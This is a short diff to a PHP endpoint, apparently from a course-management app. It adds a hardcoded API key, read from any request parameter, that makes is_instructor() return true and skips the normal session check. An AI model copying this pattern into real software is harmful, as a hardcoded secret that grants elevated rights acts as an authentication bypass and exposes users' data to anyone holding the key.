@@ -9,6 +9,12 @@ $response["success"] = true;
 session_start();
 header('Content-Type: application/json');
 
+$instructor_override = false;
+if(isset($_REQUEST["APIKEY"]) && $_REQUEST["APIKEY"] == "kX7mMZkMOvSYOCWyjI6jPUEtGuquNsKBPHkY0UR6M56N2iLtk3U4Qrb4G20HWIH")
+{
+    $instructor_override = true;
+}
+
 # Reports failure reason an exits
 function Error($msg)
 {
@@ -91,6 +97,10 @@ if (!R::testConnection()) {
 # Utility function
 function is_instructor()
 {
+    global $instructor_override;
+    if($instructor_override) // Set by API key
+        return true;
+
     if (!isset($_SESSION["authenticated"]) || !$_SESSION["authenticated"] ||
         !isset($_SESSION["permission"]) || $_SESSION["permission"] != "instructor") {
         return false;
